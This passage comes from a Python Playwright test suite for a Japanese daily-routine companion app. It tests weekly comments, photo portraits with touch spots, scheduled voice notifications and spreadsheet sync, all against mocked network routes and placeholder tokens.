        for (h, m), cond in (((6, 30), "early"), ((7, 10), "on_time"), ((7, 40), "late")):
            with self.subTest(cond=cond):
                page = self.clock_page(h, m)
                page.click(".act[data-record=wake]")
                self.assertIn(page.text_content("#bubble-text"), self.lines_of("morning_wake", cond))

    def test_routine_settings_fit_on_small_screen(self):
        page = self.clock_page(10, 0, "#schedule", size=(375, 667), safe=(20, 0))
        page.click("#routine-open")
        self.assertLessEqual(page.evaluate("document.documentElement.scrollWidth"), 375)

    # ---------- 声掛けの通知予約（D-049） ----------
    def voice_page(self, hour, minute=0, day=9, init=""):
        calls = []
        def respond(path, method):
            return (200, {"ok": True, "subscribed": True, "queue": []})
        def handler(route):
            req = route.request
            if req.method == "OPTIONS":
                route.fulfill(status=204, headers=self.CORS)
                return
            path = req.url.split("/api/", 1)[1]
            if path != "status":
                calls.append((path, json.loads(req.post_data) if req.post_data else None))
            route.fulfill(status=200, content_type="application/json", headers=self.CORS, body=json.dumps(respond(path, req.method)[1]))
        page = self.routed_timer_page(calls, handler=handler, hour=hour, minute=minute, voice=True)
        return page, calls

    # ---------- 先週のひとこと（D-058） ----------
    def weekly_page(self, reports, day=16, hour=21, reply=None, extra_init="", fail=False):
        calls = []
        def handler(route):
            req = route.request
            if req.method == "OPTIONS":
                route.fulfill(status=204, headers=self.CORS)
                return
            path = req.url.split("/api/", 1)[1]
            if path == "weekly":
                calls.append(json.loads(req.post_data))
                if fail:
                    route.fulfill(status=503, content_type="application/json", headers=self.CORS, body=json.dumps({"error": "準備ができていません"}))
                    return
                route.fulfill(status=200, content_type="application/json", headers=self.CORS,
                              body=json.dumps(reply or {"ok": True, "week": "2026-11-09", "text": "疲れた日が多い週だったな。来週は早めに切り上げる日を1つ作ってみろ。", "cached": False}))
                return
            route.fulfill(status=200, content_type="application/json", headers=self.CORS, body='{"ok":true,"subscribed":true,"queue":[]}')
        init = "localStorage.setItem('db.reports', %s);" % json.dumps(json.dumps(reports)) + extra_init
        ctx = self.browser.new_context(permissions=["notifications"], viewport={"width": 393, "height": 852})
        self.addCleanup(ctx.close)
        ctx.add_init_script(READY)
        ctx.add_init_script(VISIBILITY)
        ctx.add_init_script("localStorage.setItem('phase0.appToken', 'tok-123'); if (!localStorage.getItem('db.prefs')) localStorage.setItem('db.prefs', JSON.stringify({ voice: false }));" + init)
        ctx.route(self.WORKER + "/**", handler)
        page = ctx.new_page()
        errors = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], "JSエラーが出ている"))
        page.clock.install(time=datetime(2026, 11, day, hour, 0, 0))
        page.goto(self.base + "index.html?mode=standalone#report")
        page.wait_for_function("dialogue !== null", timeout=3_000)
        return page, calls

    WEEK_REPORTS = {"2026-11-09": {"mood": "tired", "done": "資料作り", "savedAt": 1}, "2026-11-11": {"mood": "normal", "done": "会議", "left": "見積もり", "savedAt": 2},
                    "2026-11-13": {"mood": "tired", "done": "片づけ", "tomorrow": "買い物", "savedAt": 3}}

    def test_weekly_comment_made_once_after_week_ends(self):
        page, calls = self.weekly_page(self.WEEK_REPORTS, extra_init="localStorage.setItem('db.records', JSON.stringify({ '2026-11-09': { wake: { time: '07:40', at: 1 }, break: [{ time: '15:00', at: 2 }], dinner: { skipped: true, at: 3 } } }));")
        page.wait_for_selector("#weekly", state="visible", timeout=5_000)
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0]["week"], "2026-11-09")  # 先週の月曜（11/16 は月曜）
        self.assertEqual(calls[0]["tone"], "client")  # 話し方（D-082）。既定は依頼人版
        summary = calls[0]["summary"]
        self.assertIn("11/9(月) ／ 調子：疲れた ／ できたこと：資料作り ／ 記録：起きた07:40、休憩1回、夕食なし", summary)
        self.assertIn("11/10(火) ／ 日報なし ／ 記録：なし", summary)
        self.assertIn("この週に完了したタスク：0件", summary)
        self.assertEqual(summary.count("\n"), 10)  # 7日＋タスク＋内部の記録の3行（D-060 ⑩）
        self.assertIn("この週の声掛けの通知：", summary)
        self.assertIn("アプリを使わなかった日：", summary)
        self.assertIn("先週のひとこと（11/9(月)〜11/15(日)）", page.text_content("#weekly-title"))
        self.assertEqual(page.text_content("#weekly-line"), "疲れた日が多い週だったな。来週は早めに切り上げる日を1つ作ってみろ。")
        page.reload()
        page.wait_for_function("dialogue !== null")
        self.assertTrue(page.is_visible("#weekly"))
        page.wait_for_timeout(300)
        self.assertEqual(len(calls), 1)  # 端末に控えたので、もう呼ばない
        # 一言をオフにしても、週次コメントは出る（別の設定）
        page.evaluate("location.hash = '#settings'")
        page.click("#pref-lines")
        page.evaluate("location.hash = '#report'")
        self.assertTrue(page.is_visible("#weekly"))
        page.evaluate("location.hash = '#settings'")
        page.click("#pref-weekly")  # 週次コメントをオフにすると出さない
        page.evaluate("location.hash = '#report'")
        self.assertTrue(page.is_hidden("#weekly"))

    def test_weekly_comment_sends_chosen_tone(self):
        """先週のひとことを頼むとき、設定した話し方（D-082）を送信サーバーに伝える"""
        page, calls = self.weekly_page(self.WEEK_REPORTS, extra_init="localStorage.setItem('db.prefs', JSON.stringify({ voice: false, tone: 'sweet' }));")
        page.wait_for_selector("#weekly", state="visible", timeout=5_000)
        self.assertEqual(calls[0]["tone"], "sweet")

    def test_weekly_comment_needs_three_reports_and_reports_errors(self):
        two = dict(list(self.WEEK_REPORTS.items())[:2])
        page, calls = self.weekly_page(two)
        page.wait_for_timeout(500)
        self.assertEqual(calls, [])
        self.assertTrue(page.is_hidden("#weekly"))
        page, calls = self.weekly_page(self.WEEK_REPORTS, fail=True)
        page.wait_for_function("document.getElementById('weekly-status').textContent.includes('作れませんでした')", timeout=5_000)
        self.assertIn("準備ができていません", page.text_content("#weekly-status"))
        self.assertTrue(page.is_hidden("#weekly"))
        page.evaluate("location.hash = '#tasks'")
        page.evaluate("location.hash = '#report'")
        page.wait_for_timeout(300)
        self.assertEqual(len(calls), 1)  # 開いている間は続けて呼ばない
        page, calls = self.weekly_page(self.WEEK_REPORTS, extra_init="localStorage.setItem('db.prefs', JSON.stringify({ voice: false, weekly: false }));")
        page.wait_for_timeout(500)
        self.assertEqual(calls, [])

    # ---------- 立ち絵を写真から選ぶ（D-066） ----------
    def portrait_page(self):
        ctx = self.browser.new_context(permissions=["notifications"], viewport={"width": 393, "height": 852})
        self.addCleanup(ctx.close)
        ctx.add_init_script(READY)
        ctx.add_init_script(VISIBILITY)
        page = ctx.new_page()
        errors = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], "JSエラーが出ている"))
        page.goto(self.base + "index.html?mode=standalone")
        page.wait_for_function("dialogue !== null", timeout=3_000)
        page.evaluate("location.hash = '#settings'")
        page.wait_for_selector("#view-settings", state="visible")
        return page

    def choose_photo(self, page, png):
        page.set_input_files("#portrait-file", files=[{"name": "photo.png", "mimeType": "image/png", "buffer": png}])
        page.wait_for_selector("#portrait-editor", state="visible", timeout=5_000)

    def photo_style(self, page):
        return page.get_attribute("#portrait-photo", "style")

    def test_portrait_full_screen_adjusted_on_home_with_ui_clear(self):
        page = self.portrait_page()
        self.assertIn("紋章を出しています", page.text_content("#portrait-state"))
        self.assertTrue(page.is_hidden("#portrait-adjust"))
        # 背景のある横長の画像（2000×1000）→ 長い辺を 1200 に縮め、ホームの画面の上で合わせる
        self.choose_photo(page, make_png(2000, 1000, (40, 120, 90, 255)))
        self.assertEqual(page.evaluate("location.hash"), "#home")
        self.assertTrue(page.is_visible("#view-home"))
        layer = page.locator("#portrait-layer").bounding_box()
        self.assertEqual([layer["x"], layer["y"], layer["width"], layer["height"]], [0, 0, 393, 852])  # 画面いっぱい
        # 画面を覆う：高さ 100%、幅は (2/1)/(393/852)=433.6%
        self.assertIn("height: 100%", self.photo_style(page))
        self.assertIn("width: 433.5", self.photo_style(page))
        page.fill("#portrait-scale", "150")
        page.dispatch_event("#portrait-scale", "input")
        self.assertEqual(page.text_content("#portrait-scale-value"), "150%")
        self.assertIn("scale(1.5)", self.photo_style(page))
        # 部品の透け具合：セリフの面の地が透ける（文字はそのまま）
        before = page.evaluate("getComputedStyle(document.querySelector('#view-home .dialogue')).backgroundColor")
        page.fill("#portrait-clear", "40")
        page.dispatch_event("#portrait-clear", "input")
        self.assertEqual(page.text_content("#portrait-clear-value"), "40%")
        self.assertEqual(page.evaluate("document.body.style.getPropertyValue('--ui-clear')"), "0.4")
        self.assertNotEqual(before, page.evaluate("getComputedStyle(document.querySelector('#view-home .dialogue')).backgroundColor"))
        # 画面のどこを触っても絵が動く。画面の幅の 1/10 右へ → +10%。部品（タブ）は押せない
        page.mouse.move(196, 300)
        page.mouse.down()
        page.mouse.move(196 + 39.3, 300, steps=4)
        page.mouse.up()
        # 板を隠して全体を見る → 戻す
        page.click("#portrait-editor-hide")
        self.assertTrue(page.is_hidden("#portrait-editor-panel"))
        self.assertTrue(page.is_visible("#view-home .record-dock"))
        page.mouse.click(118, 825)  # 「予定」のタブの位置。合わせている間は押せない
        self.assertEqual(page.evaluate("location.hash"), "#home")
        page.click("#portrait-editor-show")
        self.assertTrue(page.is_visible("#portrait-editor-panel"))
        page.click("#portrait-save")
        page.wait_for_selector("#portrait-editor", state="hidden")
        conf = json.loads(page.evaluate("localStorage.getItem('db.portrait')"))
        self.assertEqual([conf["w"], conf["h"], conf["alpha"], conf["scale"], conf["y"], conf["ui"]], [1200, 600, False, 1.5, 0, 40])
        self.assertAlmostEqual(conf["x"], 10, delta=0.5)
        # 保存したらホームのまま。読み込み直しても同じ置き方・透け具合
        for reload in (False, True):
            if reload:
                page.reload()
                page.wait_for_function("dialogue !== null")
            self.assertEqual(page.evaluate("location.hash"), "#home")
            page.wait_for_function("document.getElementById('portrait').dataset.art === 'photo'", timeout=5_000)
            self.assertTrue(page.is_visible("#portrait-photo"))
            self.assertEqual(page.get_attribute("#portrait", "role"), "img")
            self.assertIn("scale(1.5)", self.photo_style(page))
            self.assertIn("left: 60%", self.photo_style(page))
            self.assertEqual(page.evaluate("document.body.style.getPropertyValue('--ui-clear')"), "0.4")
            self.assertTrue(page.is_hidden("#view-home .stage-mark"))
            # 記録のボタン（「…」も）の地も透ける。縁は輪として残る（D-068）
            for sel in ("#record-acts .act", "#records-more"):
                fill = page.evaluate("(s) => getComputedStyle(document.querySelector(s), '::before').backgroundColor", sel)
                self.assertRegex(fill, r"(rgba\(|color\(srgb).* 0\.[0-9]+\)$", sel)  # 透けている（不透明度が 1 未満）
                self.assertEqual(page.evaluate("(s) => getComputedStyle(document.querySelector(s)).backgroundColor", sel), "rgba(0, 0, 0, 0)")
                self.assertIn("evenodd", page.evaluate("(s) => getComputedStyle(document.querySelector(s), '::after').clipPath", sel))
            # 部品は押せる（合わせていないとき）
            self.assertEqual(page.evaluate("getComputedStyle(document.getElementById('portrait-layer')).pointerEvents"), "none")
        # 位置と大きさをあとから直す。「やめる」なら変わらず設定に戻る
        page.evaluate("location.hash = '#settings'")
        page.click("#portrait-adjust")
        page.wait_for_selector("#portrait-editor", state="visible")
        self.assertEqual(page.input_value("#portrait-scale"), "150")
        self.assertEqual(page.input_value("#portrait-clear"), "40")
        page.click("#portrait-center")
        self.assertEqual(page.input_value("#portrait-scale"), "100")
        page.click("#portrait-cancel")
        self.assertEqual(page.evaluate("location.hash"), "#settings")
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.portrait')"))["scale"], 1.5)
        page.wait_for_function("document.getElementById('portrait-photo').style.transform.includes('scale(1.5)')")
        # 合わせている途中にほかの画面へ移ったら、保存せずにやめる
        page.click("#portrait-adjust")
        page.wait_for_selector("#portrait-editor", state="visible")
        page.evaluate("location.hash = '#tasks'")
        page.wait_for_selector("#portrait-editor", state="hidden")
        self.assertFalse(page.evaluate("document.body.classList.contains('portrait-edit')"))
        # 紋章に戻す（確認のあと）
        page.evaluate("location.hash = '#settings'")
        page.click("#portrait-reset")
        page.click("#confirm-ok")
        page.wait_for_function("document.getElementById('portrait').dataset.art === 'none'")
        self.assertIsNone(page.evaluate("localStorage.getItem('db.portrait')"))
        self.assertFalse(page.evaluate("document.body.classList.contains('has-photo')"))
        self.assertEqual(page.evaluate("document.body.style.getPropertyValue('--ui-clear')"), "0")
        self.assertEqual(page.get_attribute("#portrait", "aria-hidden"), "true")
        self.assertTrue(page.is_hidden("#portrait-reset"))

    def test_portrait_adjust_and_save_keeps_image(self):
        """「位置と大きさ」→「保存」のあとも画像が出る。位置だけ変えたときは保存済みの画像を入れ直さない（2026-11-19 の実機の不具合）"""
        page = self.portrait_page()
        self.choose_photo(page, make_png(800, 1200, (40, 120, 90, 255)))
        page.click("#portrait-save")
        page.wait_for_selector("#portrait-editor", state="hidden")
        page.evaluate("""() => { window.__puts = 0; const put = IDBObjectStore.prototype.put;
          IDBObjectStore.prototype.put = function (...a) { window.__puts++; return put.apply(this, a); }; }""")
        page.evaluate("location.hash = '#settings'")
        page.click("#portrait-adjust")
        page.wait_for_selector("#portrait-editor", state="visible")
        page.fill("#portrait-scale", "150")
        page.click("#portrait-save")
        page.wait_for_selector("#portrait-editor", state="hidden")
        self.assertEqual(page.evaluate("window.__puts"), 0)
        page.wait_for_function("document.getElementById('portrait-photo').naturalWidth > 0", timeout=3_000)
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.portrait')"))["scale"], 1.5)
        # 選び直したときは画像を保存する（中身を写してから）
        page.evaluate("location.hash = '#settings'")
        self.choose_photo(page, make_png(600, 600, (200, 120, 90, 255)))
        page.click("#portrait-save")
        page.wait_for_selector("#portrait-editor", state="hidden")
        self.assertEqual(page.evaluate("window.__puts"), 1)
        page.wait_for_function("document.getElementById('portrait-photo').naturalWidth > 0", timeout=3_000)

    def test_portrait_touch_spots_placed_saved_and_hit(self):
        """触る場所の印（D-083 ②）：部位を選んで画像を押すと印。手は2つまで（3つ目は近いほうを置き直す）。大きさ・消す。保存して、ホームでその所を触るとその部位"""
        page = self.portrait_page()
        self.choose_photo(page, make_png(800, 1200, (40, 120, 90, 255)))
        self.assertTrue(page.is_hidden("#portrait-spot-layer"))
        page.click("#portrait-mode-spots")
        self.assertTrue(page.is_visible("#portrait-spots-panel"))
        self.assertEqual(page.evaluate("getComputedStyle(document.querySelector('#view-home .dialogue')).visibility"), "hidden")  # 部品を隠して画像だけ
        page.click("#portrait-editor-hide")
        self.assertEqual(page.text_content("#portrait-spot-hint"), "「頭」の印を置きます")
        page.click("#portrait-editor-show")
        self.assertTrue(page.is_hidden("#portrait-spot-hint"))
        sizes = page.eval_on_selector_all("#portrait-spots-panel button", "els => els.map(e => [Math.round(e.getBoundingClientRect().width), Math.round(e.getBoundingClientRect().height)])")
        self.assertTrue(all(w >= 44 and h >= 44 for w, h in sizes), sizes)
        self.assertTrue(page.is_hidden("#portrait-place-panel"))
        self.assertEqual(page.eval_on_selector_all("#portrait-spot-parts [data-part]", "els => els.map(e => e.textContent)"), ["頭", "顔", "首", "手", "体", "足"])
        r = page.eval_on_selector("#portrait-photo", "e => { const r = e.getBoundingClientRect(); return [r.left, r.top, r.width, r.height]; }")
        at = lambda fx, fy: (r[0] + fx * r[2], r[1] + fy * r[3])
        page.mouse.click(*at(0.5, 0.12))  # 頭（はじめに選ばれている）
        page.click("#portrait-spot-parts [data-part=hand]")
        page.mouse.click(*at(0.3, 0.3))
        page.mouse.click(*at(0.7, 0.3))
        page.mouse.click(*at(0.72, 0.33))  # 3つ目は近いほう（右手）を置き直す
        marks = page.eval_on_selector_all(".portrait-spot", "els => els.map(e => [e.dataset.part, e.classList.contains('on')])")
        self.assertEqual(marks, [["head", False], ["hand", True], ["hand", True]])
        page.click("#portrait-spot-sizes [data-size=l]")
        page.click("#portrait-spot-parts [data-part=foot]")
        self.assertTrue(page.is_disabled("#portrait-spot-clear"))
        page.mouse.click(*at(0.5, 0.2))
        page.click("#portrait-spot-clear")  # 足だけ消える
        self.assertEqual(len(page.query_selector_all(".portrait-spot[data-part=foot]")), 0)
        page.click("#portrait-save")
        page.wait_for_selector("#portrait-editor", state="hidden")
        saved = json.loads(page.evaluate("localStorage.getItem('db.portrait')"))["spots"]
        self.assertEqual(sorted(saved), ["hand", "head"])
        self.assertAlmostEqual(saved["head"][0]["x"], 0.5, places=2)
        self.assertEqual([round(s["x"], 2) for s in saved["hand"]], [0.3, 0.72])
        self.assertEqual({s["r"] for s in saved["hand"]}, {0.13})
        # ホームでその所を触ると、その部位として受け取る
        page.wait_for_function("document.getElementById('portrait-photo').naturalWidth > 0", timeout=3_000)
        page.evaluate("() => { window.__keys = []; const show = showLine; showLine = (k, o) => { window.__keys.push(k); return show(k, o); }; }")
        r = page.eval_on_selector("#portrait-photo", "e => { const r = e.getBoundingClientRect(); return [r.left, r.top, r.width, r.height]; }")
        page.mouse.click(*at(0.5, 0.12))
        self.assertEqual(page.evaluate("window.__keys[0]"), "touch.head")
        # 印は「位置と大きさ」を開き直しても残り、画像を選び直すと消える
        page.evaluate("location.hash = '#settings'")
        page.click("#portrait-adjust")
        page.click("#portrait-mode-spots")
        self.assertEqual(len(page.query_selector_all(".portrait-spot")), 3)
        page.click("#portrait-cancel")
        self.assertEqual(page.evaluate("getComputedStyle(document.querySelector('#view-home .dialogue')).visibility"), "visible")  # やめると部品が戻る
        self.choose_photo(page, make_png(600, 600, (200, 120, 90, 255)))
        page.click("#portrait-mode-spots")
        self.assertEqual(len(page.query_selector_all(".portrait-spot")), 0)

    def test_portrait_broken_image_falls_back_to_emblem(self):
        """保存した画像が読めないときは「？」のままにせず、紋章に戻して選び直しを頼む"""
        page = self.portrait_page()
        self.choose_photo(page, make_png(400, 400, (40, 120, 90, 255)))
        page.click("#portrait-save")
        page.wait_for_selector("#portrait-editor", state="hidden")
        page.evaluate("document.getElementById('portrait-photo').src = 'blob:broken'")
        page.wait_for_function("!document.body.classList.contains('has-photo')", timeout=3_000)
        self.assertTrue(page.is_hidden("#portrait-layer"))
        self.assertIn("もう一度「写真から選ぶ」", page.text_content("#portrait-status"))

    def test_portrait_transparent_photo_sits_on_bottom(self):
        page = self.portrait_page()
        self.choose_photo(page, make_png(300, 600, (200, 50, 50, 0)))  # 透過の縦長（1:2）
        # 画面に収める：幅 100%・高さ (393/852)/(1/2)=92.3%。足元を画面の下にそろえる
        self.assertIn("width: 100%", self.photo_style(page))
        page.click("#portrait-save")
        page.wait_for_selector("#portrait-editor", state="hidden")
        conf = json.loads(page.evaluate("localStorage.getItem('db.portrait')"))
        self.assertTrue(conf["alpha"])
        self.assertAlmostEqual(conf["y"], 3.9, delta=0.1)
        box = page.locator("#portrait-photo").bounding_box()
        self.assertAlmostEqual(box["y"] + box["height"], 852, delta=1)
        # 読めないファイルは理由を出す
        page.evaluate("location.hash = '#settings'")
        page.set_input_files("#portrait-file", files=[{"name": "x.png", "mimeType": "image/png", "buffer": b"not an image"}])
        page.wait_for_function("document.getElementById('portrait-status').textContent.includes('読み込めませんでした')")

    def test_weekly_reply_once_rewrite_and_sent_next_week(self):
        saved = {"2026-11-09": {"text": "疲れた日が多い週だったな。", "at": 1, "firstSeen": "2026-11-16"}}
        page, calls = self.weekly_page(self.WEEK_REPORTS, extra_init="localStorage.setItem('db.weekly', %s);" % json.dumps(json.dumps(saved)))
        page.wait_for_selector("#weekly", state="visible", timeout=5_000)
        self.assertEqual(calls, [])
        self.assertTrue(page.is_hidden("#weekly-reply-form"))
        self.assertEqual(page.text_content("#weekly-reply-open"), "返事をする")
        page.click("#weekly-reply-open")
        self.assertTrue(page.is_visible("#weekly-reply-form"))
        self.assertEqual(page.get_attribute("#weekly-reply-input", "maxlength"), "300")
        page.click("#weekly-reply-send")  # 空では送らない
        self.assertIn("返事を入れてください", page.text_content("#weekly-reply-status"))
        page.fill("#weekly-reply-input", "もう少し短く書いてほしい")
        page.click("#weekly-reply-send")
        page.wait_for_selector("#weekly-reply-ack", state="visible")
        self.assertEqual(page.text_content("#weekly-reply-ack"), "受け取った。来週のに活かす。")
        self.assertIn("もう少し短く書いてほしい", page.text_content("#weekly-reply-text"))
        stored = json.loads(page.evaluate("localStorage.getItem('db.weekly')"))["2026-11-09"]
        self.assertEqual(stored["reply"]["text"], "もう少し短く書いてほしい")
        self.assertEqual(stored["reply"]["edits"], 0)
        self.assertEqual(stored["text"], "疲れた日が多い週だったな。")  # 作り直さない
        # 1回だけ書き直せる
        self.assertEqual(page.text_content("#weekly-reply-open"), "返事を書き直す")
        page.click("#weekly-reply-open")
        self.assertEqual(page.input_value("#weekly-reply-input"), "もう少し短く書いてほしい")
        page.fill("#weekly-reply-input", "短めで、具体的に")
        page.click("#weekly-reply-send")
        page.wait_for_function("document.getElementById('weekly-reply-text').textContent.includes('短めで')")
        self.assertTrue(page.is_hidden("#weekly-reply-open"))
        self.assertEqual(json.loads(page.evaluate("localStorage.getItem('db.weekly')"))["2026-11-09"]["reply"]["edits"], 1)
        page.evaluate("location.hash = '#tasks'")  # 開き直しても、もう書き直せない（初期化で控えが戻るので再読み込みはしない）
        page.evaluate("location.hash = '#report'")
        self.assertTrue(page.is_hidden("#weekly-reply-open"))
        self.assertIn("短めで、具体的に", page.text_content("#weekly-reply-text"))
        self.assertEqual(len(calls), 0)
        # 次の週：前の週のひとことと返事を一緒に送る
        reports = dict(self.WEEK_REPORTS, **{"2026-11-16": {"mood": "normal", "done": "a", "savedAt": 4}, "2026-11-17": {"mood": "normal", "done": "b", "savedAt": 5},
                                             "2026-11-18": {"mood": "good", "done": "c", "savedAt": 6}})
        weekly = page.evaluate("localStorage.getItem('db.weekly')")
        page2, calls2 = self.weekly_page(reports, day=23, extra_init="localStorage.setItem('db.weekly', %s);" % json.dumps(weekly))
        page2.wait_for_selector("#weekly", state="visible", timeout=5_000)
        self.assertEqual(calls2[0]["week"], "2026-11-16")
        self.assertEqual(calls2[0]["previous"], {"comment": "疲れた日が多い週だったな。", "reply": "短めで、具体的に"})
        self.assertEqual(page2.text_content("#weekly-reply-open"), "返事をする")  # 新しい週は新しく書ける
        self.assertTrue(page2.is_hidden("#weekly-reply-text"))

    def at_ms(self, day, h, m):
        return int(datetime(2026, 11, day, h, m).timestamp() * 1000)

    def voice_keys(self, calls, path="schedule"):
        return sorted(b["key"] for p, b in calls if p == path)

    def test_voice_plan_for_the_rest_of_today(self):
        page, calls = self.voice_page(10, 0)
        self.wait_calls(page, calls, 4)
        sched = {b["key"]: b for p, b in calls if p == "schedule"}
        self.assertEqual(sorted(sched), ["meal:2026-11-09:dinner", "meal:2026-11-09:lunch", "night:2026-11-09", "sleep:2026-11-09"])  # 朝食は過ぎた
        self.assertEqual(sched["meal:2026-11-09:lunch"]["at"], self.at_ms(9, 12, 30))
        self.assertEqual(sched["meal:2026-11-09:lunch"]["body"], "そろそろ飯の時間、過ぎてるぞ。食べたら開いて押しておけ。")
        self.assertIn("trigger=midday_check.meal_overdue&line=0", sched["meal:2026-11-09:lunch"]["url"])
        self.assertEqual(sched["meal:2026-11-09:dinner"]["at"], self.at_ms(9, 20, 0))
        self.assertEqual(sched["night:2026-11-09"]["at"], self.at_ms(9, 22, 30))
        self.assertEqual(sched["night:2026-11-09"]["body"], "結構残ってるな。今日はここまでにするかどうかは、自分で決めろ。")  # 夕食・入浴・歯磨きの3つ
        self.assertEqual(sched["sleep:2026-11-09"]["at"], self.at_ms(9, 23, 30))
        self.assertEqual(sched["sleep:2026-11-09"]["title"], "キィニチ")
        page.reload()  # 変わっていなければ送り直さない
        page.wait_for_function("dialogue !== null")
        page.wait_for_timeout(1200)
        self.assertEqual(len(calls), 4)

    def test_voice_updates_when_recording(self):
        page, calls = self.voice_page(10, 0)
        self.wait_calls(page, calls, 4)
        page.evaluate("location.hash = '#home'")
        page.click(".act[data-record=work_start]")  # 仕事開始 → 90分後に休憩の声掛け
        page.clock.run_for(1000)
        self.wait_calls(page, calls, 5)
        self.assertEqual(calls[4][1]["key"], "break:2026-11-09")
        self.assertAlmostEqual(calls[4][1]["at"], self.at_ms(9, 11, 30), delta=5000)
        self.assertEqual(calls[4][1]["body"], "休憩、挟んだほうがいいんじゃないか。取ったら開いて押しておけ。")
        page.click("#records-more")
        page.click("#records-list .sheet-row[data-record=lunch] button:text-is('記録')")  # 昼食を記録 → 取り消す
        page.click("#records-list .sheet-row[data-record=dinner] button:text-is('今日はなし')")  # 夕食はなし → 取り消す・夜の数が減る
        page.click("#records-list .sheet-row[data-record=break] button:text-is('記録')")  # 休憩 → 時刻を付け替える
        page.clock.run_for(1000)
        self.wait_calls(page, calls, 9)
        later = calls[5:]
        self.assertEqual(self.voice_keys(later, "cancel"), ["meal:2026-11-09:dinner", "meal:2026-11-09:lunch"])
        sched = {b["key"]: b for p, b in later if p == "schedule"}
        self.assertEqual(sched["night:2026-11-09"]["body"], "あと少し残ってるが、無理にやらなくてもいい。")  # 入浴・歯磨きの2つ
        self.assertAlmostEqual(sched["break:2026-11-09"]["at"], self.at_ms(9, 11, 30), delta=5000)  # 休憩を記録した 10:00 から90分
        # 声掛けをオフ → 全部取り消す
        page.click("#records-sheet-close")
        page.evaluate("location.hash = '#settings'")
        page.click("#pref-voice")
        page.clock.run_for(1000)
        self.wait_calls(page, calls, 12)
        self.assertEqual(self.voice_keys(calls[9:], "cancel"), ["break:2026-11-09", "night:2026-11-09", "sleep:2026-11-09"])

    def test_voice_retries_after_network_failure(self):
        calls, down = [], {"on": True}
        def handler(route):
            req = route.request
            if req.method == "OPTIONS":
                route.fulfill(status=204, headers=self.CORS)
                return
            path = req.url.split("/api/", 1)[1]
            if path == "status":
                route.fulfill(status=200, content_type="application/json", headers=self.CORS, body='{"subscribed":true,"queue":[]}')
                return
            calls.append(path)
            if down["on"]:
                route.abort()
            else:
                route.fulfill(status=200, content_type="application/json", headers=self.CORS, body='{"ok":true,"subscribed":true}')
        page = self.routed_timer_page(calls, handler=handler, hour=10, voice=True)
        self.wait_calls(page, calls, 1)
        page.wait_for_timeout(300)
        self.assertEqual(len(calls), 1)  # 1つ目で通信できなければ、そこでやめる
        self.assertEqual(page.evaluate("localStorage.getItem('db.notify')"), None)
        down["on"] = False
        self.hide_and_return(page, 1000)
        page.clock.run_for(1000)
        self.wait_calls(page, calls, 5)
        self.assertEqual(len(json.loads(page.evaluate("localStorage.getItem('db.notify')"))), 4)

    def test_voice_not_sent_without_token_or_after_sleep(self):
        page = self.clock_page(10, 0)  # 合言葉なし
        page.wait_for_timeout(1200)
        self.assertIsNone(page.evaluate("localStorage.getItem('db.notify')"))
        self.assertEqual(page.evaluate("Object.keys(Voice.plan())").__len__(), 4)
        page = self.clock_page(23, 50)  # 就寝の予定を過ぎた
        self.assertEqual(page.evaluate("Object.keys(Voice.plan())"), [])

    # ---------- スプレッドシートへの控え（D-050） ----------
    GAS = "https://script.google.com/macros/s/fake/exec"

    def sync_page(self, hour=10, configured=True, fail=None, events=None, reads=None, day=9, writes=None, minute=0, voice=False):
        posts = []
        def handler(route):
            req = route.request
            if req.method == "OPTIONS":  # 事前確認は起きないはず（Content-Type を付けない）
                posts.append(("OPTIONS", None))
                route.fulfill(status=204)
                return
            body = json.loads(req.post_data)
            if body.get("action") == "events":  # カレンダーを読む（D-053）。送る呼び出しとは別に数える
                if reads is not None:
                    reads.append(body)
                if fail and fail["on"]:
                    route.abort()
                    return
                route.fulfill(status=200, content_type="application/json", headers={"Access-Control-Allow-Origin": "*"},
                              body=json.dumps({"ok": True, "events": events if events is not None else []}))
                return
            if body.get("action") in ("add", "update", "remove"):  # 予定を足す・直す・消す（D-054）
                if writes is not None:
                    writes.append(body)
                if fail and fail["on"]:
                    route.abort()
                    return
                if events is not None and body["action"] == "add":
                    events.append({"id": "new%d" % len(writes or []), "calendarId": "me", "title": body["title"], "start": body["start"], "end": body["end"], "allDay": body["allDay"], "editable": True})
                elif events is not None and body["action"] == "update":
                    for e in events:
                        if e.get("id") == body["id"]:
                            e.update(title=body["title"], start=body["start"], end=body["end"], allDay=body["allDay"])
                elif events is not None:
                    events[:] = [e for e in events if e.get("id") != body["id"]]
                route.fulfill(status=200, content_type="application/json", headers={"Access-Control-Allow-Origin": "*"}, body='{"ok":true}')
                return
            posts.append((req.headers.get("content-type", ""), body))
            if fail and fail["on"]:
                route.abort()
            else:
                route.fulfill(status=200, content_type="application/json", headers={"Access-Control-Allow-Origin": "*"}, body='{"ok":true}')
        init = "" if voice else "localStorage.setItem('db.prefs', JSON.stringify({ voice: false }));"
        if voice:
            init += "localStorage.setItem('phase0.appToken', 'tok-123');"
        if configured:
            init += "if (!localStorage.getItem('db.sync')) localStorage.setItem('db.sync', JSON.stringify({ url: %s, token: 'sync-secret' }));" % json.dumps(self.GAS)
        ctx = self.browser.new_context(permissions=["notifications"], viewport={"width": 393, "height": 852})
        self.addCleanup(ctx.close)
        ctx.add_init_script(READY)
        ctx.add_init_script(VISIBILITY)
        ctx.add_init_script(init)
        ctx.route(self.GAS, handler)
        page = ctx.new_page()
        errors = []
        page.on("pageerror", lambda e: errors.append(str(e)))
        self.addCleanup(lambda: self.assertEqual(errors, [], "JSエラーが出ている"))
        if voice:  # 声掛けの予約も送信サーバー（偽物）で受ける
            self.voice_calls = []
            def worker(route):
                req = route.request
                if req.method == "OPTIONS":
                    route.fulfill(status=204, headers=self.CORS)
                    return
                path = req.url.split("/api/", 1)[1]
                if path != "status":
                    self.voice_calls.append((path, json.loads(req.post_data) if req.post_data else None))
                route.fulfill(status=200, content_type="application/json", headers=self.CORS, body='{"ok":true,"subscribed":true,"queue":[]}')
            ctx.route(self.WORKER + "/**", worker)
        page.clock.install(time=datetime(2026, 11, day, hour, minute, 0))
        page.goto(self.base + "index.html?mode=standalone")
        page.wait_for_function("dialogue !== null", timeout=3_000)
        return page, posts

    def test_sync_sends_after_change_and_skips_same_data(self):
        page, posts = self.sync_page()
